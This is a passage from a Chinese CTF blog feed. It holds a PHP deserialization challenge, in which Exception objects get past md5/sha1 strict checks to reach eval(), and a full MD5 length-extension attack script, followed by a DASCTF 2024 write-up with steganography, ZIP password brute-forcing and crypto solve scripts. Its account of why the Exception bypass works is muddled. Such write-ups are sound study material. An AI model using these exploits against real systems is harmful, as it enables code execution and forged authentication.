class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;var1);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;var2);<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">$this</span>-&gt;var1 != <span class="hljs-variable language_">$this</span>-&gt;var2) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;var1) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;var2)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;var1) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;var2))) &#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;var1);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>这里可以利用php的EXCEPTION异常类进行绕过，exp如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cianiao</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var2</span>;<br>&#125; <br><br><span class="hljs-variable">$cmd</span>=<span class="hljs-string">&quot;phpinfo();?&gt;&quot;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-variable">$cmd</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-variable">$cmd</span>,<span class="hljs-number">1</span>);<br><br><span class="hljs-variable">$tr</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">cianiao</span>();<br><span class="hljs-variable">$tr</span>-&gt;var1=<span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$tr</span>-&gt;var2=<span class="hljs-variable">$b</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$tr</span>));<br><br></code></pre></td></tr></table></figure><p>输入可以进行绕过，原理是采用<code>Exception</code>类绕过<code>md5</code>、<code>sha1</code>等哈希函数的强等于（<code>===</code>）检查，因为在特定情况下，PHP的类型转换机制会导致哈希碰撞被误解为相等。这种类型转换的特性可以通过抛出异常并捕获它们来实现。</p><p>ps:路径长度和包含的特殊字符（如中文字符）在序列化和反序列化过程中可能会出现编码问题，尤其是在不同环境中（如不同版本的 PHP，不同的操作系统）处理这些路径时，会导致路径解析错误或乱码，从而影响程序的正常执行。因此我的没有显示页面，但是也显示了字符串。</p><h3 id="q4md5长度拓展攻击"><a class="markdownIt-Anchor" href="#q4md5长度拓展攻击"></a> Q4:MD5长度拓展攻击</h3><p>先上个例题吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>( <span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$secret</span>=<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$secret</span>);<span class="hljs-comment">//告诉你他的MD5吧</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br><span class="hljs-variable">$orange</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;orange&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$orange</span>,-<span class="hljs-number">6</span>)!==<span class="hljs-string">&#x27;orange&#x27;</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono&quot;</span>);<br>&#125;<br><span class="hljs-variable">$md5</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$secret</span>.<span class="hljs-variable">$orange</span>)===<span class="hljs-variable">$md5</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;good job!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>已知secret的MD5值，secret的长度为32,orange的末尾值是orange，需要得到最后的等式，我们不讲原理，直接做题吧</p><p>贴上解题脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack, unpack<br><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> floor, sin<br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">MD5 Extension Attack</span><br><span class="hljs-string">====================</span><br><span class="hljs-string"></span><br><span class="hljs-string">@refs</span><br><span class="hljs-string">https://github.com/shellfeel/hash-ext-attack</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MD5</span>:<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.A, <span class="hljs-variable language_">self</span>.B, <span class="hljs-variable language_">self</span>.C, <span class="hljs-variable language_">self</span>.D = \<br>            (<span class="hljs-number">0x67452301</span>, <span class="hljs-number">0xefcdab89</span>, <span class="hljs-number">0x98badcfe</span>, <span class="hljs-number">0x10325476</span>)  <span class="hljs-comment"># initial values</span><br>        <span class="hljs-variable language_">self</span>.r: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>] = \<br>            [<span class="hljs-number">7</span>, <span class="hljs-number">12</span>, <span class="hljs-number">17</span>, <span class="hljs-number">22</span>] * <span class="hljs-number">4</span> + [<span class="hljs-number">5</span>,  <span class="hljs-number">9</span>, <span class="hljs-number">14</span>, <span class="hljs-number">20</span>] * <span class="hljs-number">4</span> + \<br>            [<span class="hljs-number">4</span>, <span class="hljs-number">11</span>, <span class="hljs-number">16</span>, <span class="hljs-number">23</span>] * <span class="hljs-number">4</span> + [<span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">21</span>] * <span class="hljs-number">4</span>  <span class="hljs-comment"># shift values</span><br>        <span class="hljs-variable language_">self</span>.k: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>] = \<br>            [floor(<span class="hljs-built_in">abs</span>(sin(i + <span class="hljs-number">1</span>)) * <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, <span class="hljs-number">32</span>))<br>             <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>)]  <span class="hljs-comment"># constants</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_lrot</span>(<span class="hljs-params">self, x: <span class="hljs-built_in">int</span>, n: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>        <span class="hljs-comment"># left rotate</span><br>        <span class="hljs-keyword">return</span> (x &lt;&lt; n) | (x &gt;&gt; <span class="hljs-number">32</span> - n)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">self, chunk: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment"># update the hash for a chunk of data (64 bytes)</span><br>        w = <span class="hljs-built_in">list</span>(unpack(<span class="hljs-string">&#x27;&lt;&#x27;</span>+<span class="hljs-string">&#x27;I&#x27;</span>*<span class="hljs-number">16</span>, chunk))<br>        a, b, c, d = <span class="hljs-variable language_">self</span>.A, <span class="hljs-variable language_">self</span>.B, <span class="hljs-variable language_">self</span>.C, <span class="hljs-variable language_">self</span>.D<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>            <span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">16</span>:<br>                f = (b &amp; c) | ((~b) &amp; d)<br>                flag = i<br>            <span class="hljs-keyword">elif</span> i &lt; <span class="hljs-number">32</span>:<br>                f = (b &amp; d) | (c &amp; (~d))<br>                flag = (<span class="hljs-number">5</span> * i + <span class="hljs-number">1</span>) % <span class="hljs-number">16</span><br>            <span class="hljs-keyword">elif</span> i &lt; <span class="hljs-number">48</span>:<br>                f = (b ^ c ^ d)<br>                flag = (<span class="hljs-number">3</span> * i + <span class="hljs-number">5</span>) % <span class="hljs-number">16</span><br>            <span class="hljs-keyword">else</span>:<br>                f = c ^ (b | (~d))<br>                flag = (<span class="hljs-number">7</span> * i) % <span class="hljs-number">16</span><br><br>            tmp = b + \<br>                <span class="hljs-variable language_">self</span>._lrot((a + f + <span class="hljs-variable language_">self</span>.k[i] + w[flag])<br>                           &amp; <span class="hljs-number">0xffffffff</span>, <span class="hljs-variable language_">self</span>.r[i])<br>            a, b, c, d = d, tmp &amp; <span class="hljs-number">0xffffffff</span>, b, c<br><br>        <span class="hljs-variable language_">self</span>.A = (<span class="hljs-variable language_">self</span>.A + a) &amp; <span class="hljs-number">0xffffffff</span><br>        <span class="hljs-variable language_">self</span>.B = (<span class="hljs-variable language_">self</span>.B + b) &amp; <span class="hljs-number">0xffffffff</span><br>        <span class="hljs-variable language_">self</span>.C = (<span class="hljs-variable language_">self</span>.C + c) &amp; <span class="hljs-number">0xffffffff</span><br>        <span class="hljs-variable language_">self</span>.D = (<span class="hljs-variable language_">self</span>.D + d) &amp; <span class="hljs-number">0xffffffff</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">extend</span>(<span class="hljs-params">self, msg: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment"># extend the hash with a new message (padded)</span><br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(msg) % <span class="hljs-number">64</span> == <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(msg), <span class="hljs-number">64</span>):<br>            <span class="hljs-variable language_">self</span>.update(msg[i:i + <span class="hljs-number">64</span>])<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">padding</span>(<span class="hljs-params">self, msg: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-comment"># pad the message</span><br>        length = pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-built_in">len</span>(msg) * <span class="hljs-number">8</span>)<br><br>        msg += <span class="hljs-string">b&#x27;\x80&#x27;</span><br>        msg += <span class="hljs-string">b&#x27;\x00&#x27;</span> * ((<span class="hljs-number">56</span> - <span class="hljs-built_in">len</span>(msg)) % <span class="hljs-number">64</span>)<br>        msg += length<br><br>        <span class="hljs-keyword">return</span> msg<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">digest</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-comment"># return the hash</span><br>        <span class="hljs-keyword">return</span> pack(<span class="hljs-string">&#x27;&lt;IIII&#x27;</span>, <span class="hljs-variable language_">self</span>.A, <span class="hljs-variable language_">self</span>.B, <span class="hljs-variable language_">self</span>.C, <span class="hljs-variable language_">self</span>.D)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_md5</span>(<span class="hljs-params">test_string: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>    <span class="hljs-comment"># (DEBUG function) verify the MD5 implementation</span><br>    <span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5 <span class="hljs-keyword">as</span> md5_hashlib<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">md5_manual</span>(<span class="hljs-params">msg: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        md5 = MD5()<br>        md5.extend(md5.padding(msg))<br>        <span class="hljs-keyword">return</span> md5.digest()<br><br>    manual_result = md5_manual(test_string).<span class="hljs-built_in">hex</span>()<br>    hashlib_result = md5_hashlib(test_string).hexdigest()<br><br>    <span class="hljs-keyword">assert</span> manual_result == hashlib_result, <span class="hljs-string">&quot;Test failed!&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">message_len: <span class="hljs-built_in">int</span>, known_hash: <span class="hljs-built_in">str</span>,</span><br><span class="hljs-params">           append_str: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">tuple</span>:<br>    <span class="hljs-comment"># MD5 extension attack</span><br>    md5 = MD5()<br><br>    previous_text = md5.padding(<span class="hljs-string">b&quot;*&quot;</span> * message_len)<br>    current_text = previous_text + append_str<br><br>    md5.A, md5.B, md5.C, md5.D = unpack(<span class="hljs-string">&quot;&lt;IIII&quot;</span>, <span class="hljs-built_in">bytes</span>.fromhex(known_hash))<br>    md5.extend(md5.padding(current_text)[<span class="hljs-built_in">len</span>(previous_text):])<br><br>    <span class="hljs-keyword">return</span> current_text[message_len:], md5.digest().<span class="hljs-built_in">hex</span>()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    message_len = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[&gt;] Input known text length: &quot;</span>))<br>    known_hash = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[&gt;] Input known hash: &quot;</span>).strip()<br>    append_text = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[&gt;] Input append text: &quot;</span>).strip().encode()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attacking...&quot;</span>)<br><br>    extend_str, final_hash = attack(message_len, known_hash, append_text)<br><br>    <span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br>    <span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Extend text:&quot;</span>, extend_str)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Extend text (URL encoded):&quot;</span>, quote(extend_str))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Extend text (Base64):&quot;</span>, b64encode(extend_str).decode())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Final hash:&quot;</span>, final_hash)<br></code></pre></td></tr></table></figure><p>本例题出题并不严谨，只是告诉一种情况</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAphp%E5%BC%BA%E5%BC%B1%E6%AF%94%E8%BE%83/4.png" alt="4"></p><p>把对应的内容填上去即可。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Md5</tag>
      
      <tag>sha1</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dasctf夏-复盘</title>
    <link href="/2024/07/21/dasctf/DASCTF%202024%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <url>/2024/07/21/dasctf/DASCTF%202024%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>孱弱，打是一打一个不吱声的，赛后跟着师傅复现一下</p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h2 id="png_master"><a class="markdownIt-Anchor" href="#png_master"></a> png_master</h2><p><img src="/../../images/DASCTF/2024%E5%A4%8F/flag.png" alt="flag"></p><p>第一部分：010分析，结尾有类似base64解密的部分提取出来解密</p><p>得到第一段内容</p><p>Congratulations on finding the first paragraph of flag, but the understanding of png is just beginning.<br><strong>flag1:DASCTF{2fd9e9ff-e27</strong></p><p>第二部分：</p><p>使用stegsolve来获得</p><p><img src="/../../images/DASCTF/2024%E5%A4%8F/1.png" alt="1"></p><p><strong>flag2:d-5405-c5f5-</strong></p><p>第三部分:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>Image=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;C:/Users/30226/Desktop/DASCTF/tempdir/MISC附件/flag.png&#x27;</span>)<br>Image.save(<span class="hljs-string">&#x27;a.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p>利用010进行对比发现IDAT多了一个很长的部分</p><p><img src="/../../images/DASCTF/2024%E5%A4%8F/2.png" alt="2"></p><p>把这部分单独读取出来，加上png头，得到图片</p><p><img src="/../../images/DASCTF/2024%E5%A4%8F/3.png" alt="3"></p><p>得到<strong>a19131f86216}</strong></p><p>最后的flag是<strong>DASCTF{2fd9e9ff-e27d-5405-c5f5-a19131f86216}</strong></p><h2 id="ez_zip"><a class="markdownIt-Anchor" href="#ez_zip"></a> EZ_zip</h2><p>跟着复现一遍吧，感觉是提示点。</p><p><img src="/../../images/DASCTF/2024%E5%A4%8F/c.png" alt="c"></p><p>zip文件损坏的问题</p><p>使用010对两个地方进行修改，再进行解压</p><p><img src="/../../images/DASCTF/2024%E5%A4%8F/a.png" alt="a"></p><p><img src="/../../images/DASCTF/2024%E5%A4%8F/b.png" alt="b"></p><p>后面就不明白了，直接引用套神的吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python">![解密](../../images/DASCTF/<span class="hljs-number">2024</span>夏/解密.png)<span class="hljs-keyword">import</span> pyzipper<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crack_zip</span>(<span class="hljs-params">zip_file_path</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        password = <span class="hljs-built_in">bytes</span>([i])<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> pyzipper.AESZipFile(zip_file_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> zip_ref:<br>                zip_ref.extractall(pwd=password)<br>                extracted_files = zip_ref.namelist()<br>                <span class="hljs-keyword">if</span> extracted_files:<br>                    <span class="hljs-keyword">return</span> password, extracted_files[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    current_zip = <span class="hljs-string">&#x27;320.zip&#x27;</span><br>    all_passwords = <span class="hljs-string">&#x27;&#x27;</span><br><br>    <span class="hljs-keyword">while</span> current_zip:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Cracking <span class="hljs-subst">&#123;current_zip&#125;</span>...&#x27;</span>)<br>        password, next_zip = crack_zip(current_zip)<br>        <span class="hljs-keyword">if</span> password:<br>            all_passwords += password.<span class="hljs-built_in">hex</span>()<br>            current_zip = next_zip<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Failed to crack <span class="hljs-subst">&#123;current_zip&#125;</span>&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;All passwords: <span class="hljs-subst">&#123;all_passwords&#125;</span>&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p>得到密码</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">1bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec611bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec611bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec611bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec611bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec611bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec611bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec611bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec611bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec611bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec6<br></code></pre></td></tr></table></figure><p>并且得到一个AES-ECB.txt</p><p>明显观察到这个密码是重复的<code>11bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec6</code></p><p>然后得到AES的内容是<code>64ZpNmbv2Hg4Jj9bH8Kv6D3OBliD9hgyI3vZWfMDJs2TcEwVnBmH/zkBtPBE3g8e the key may be on your journey？</code></p><p>尝试用这个密码当aes的密码不对，猜测是解压顺序是从320–&gt;1，而密码顺序是1–&gt;320，因此需要反过来</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11<br></code></pre></td></tr></table></figure><p><img src="/../../images/DASCTF/2024%E5%A4%8F/%E8%A7%A3%E5%AF%86.png" alt="解密"></p><p><strong>DASCTF{514755c6-8280-463c-8378-a29702fc88df}</strong></p><h1 id="re"><a class="markdownIt-Anchor" href="#re"></a> Re</h1><h2 id="dossnake"><a class="markdownIt-Anchor" href="#dossnake"></a> DosSnake</h2><p>ida打开，定位到dasctf</p><p>这段部分的内容与dasctf进行xor得到flag</p><p><img src="/../../images/DASCTF/2024%E5%A4%8F/re.png" alt="re"></p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="complex_enc"><a class="markdownIt-Anchor" href="#complex_enc"></a> complex_enc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">cipher, key</span>):<br>    decrypted_bits = [<span class="hljs-number">0</span>] * <span class="hljs-built_in">len</span>(key)  <span class="hljs-comment"># 初始化为与密钥相同长度的比特流</span><br><br>    <span class="hljs-comment"># 逆序遍历密钥，逐步恢复比特流</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key) - <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> cipher &gt;= key[i]:<br>            cipher -= key[i]<br>            decrypted_bits[i] = <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">return</span> decrypted_bits<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bits_to_bytes</span>(<span class="hljs-params">bits</span>):<br>    byte_array = <span class="hljs-built_in">bytearray</span>()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bits), <span class="hljs-number">8</span>):<br>        byte = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> bits[i:i+<span 